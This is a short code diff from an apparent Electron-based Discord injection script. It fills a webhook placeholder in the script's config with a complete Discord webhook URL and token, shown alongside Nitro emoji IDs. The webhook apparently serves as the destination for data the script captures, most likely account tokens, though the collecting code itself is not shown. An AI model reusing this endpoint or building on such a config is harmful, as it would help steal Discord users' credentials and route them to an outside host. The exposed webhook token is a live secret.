@@ -6,7 +6,7 @@ const querystring = require("querystring");
 const { BrowserWindow, session } = require("electron");
 
 const config = {
-  webhook: "%WEBHOOK%",
+  webhook: "https://discord.com/api/webhooks/1263459147937218621/IEXfofTrj3uhMl3tTX58yO6lI91P9r2yHTXtgUn6zOjuKO3J2i6a6z_a9ty2CuaNHeHI",
   "embed-color": 3553599,
   emojis: {
     nitroType: "<a:nitro_type:990735596446167060>",
